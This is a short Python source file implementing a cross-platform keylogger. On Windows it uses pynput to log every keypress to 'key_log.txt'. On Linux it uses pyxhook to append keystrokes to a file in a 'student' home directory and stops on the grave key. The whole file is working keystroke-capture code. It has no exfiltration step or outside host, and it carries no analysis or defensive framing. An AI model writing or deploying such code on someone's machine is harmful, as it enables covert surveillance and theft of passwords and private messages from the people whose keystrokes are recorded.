import platform
import sys
mySystem = platform.system()
if mySystem == 'Linux':
    import pyxhook

from pynput.keyboard import Key, Listener
import logging

#execute windows keylogger
if mySystem == 'Windows':
    print("Windows")
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "key_log.txt"),level=logging.DEBUG,
            format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()

#execute linux keylogger
elif mySystem == 'Linux':
    #change this to the log file's path
    log_file = '/home/student/Desktop/file.log'
    #this function is called every time a key is pressed
    def OnKeyPress(event):
        fob = open(log_file,'a')
        fob.write(event.Key)
        fob.write('\n')
        
        #ascii value of the grave key (`)
        if event.Ascii == 96:
            fob.close()
            new_hook.cancel()
    #instanstiate HookManager class
    new_hook = pyxhook.HookManager()
    #listen to all keystrokes
    new_hook.KeyDown = OnKeyPress
    #hook the keyboard
    new_hook.HookKeyboard()
    #start the session
    new_hook.start()
else:
    print("Invalid OS")
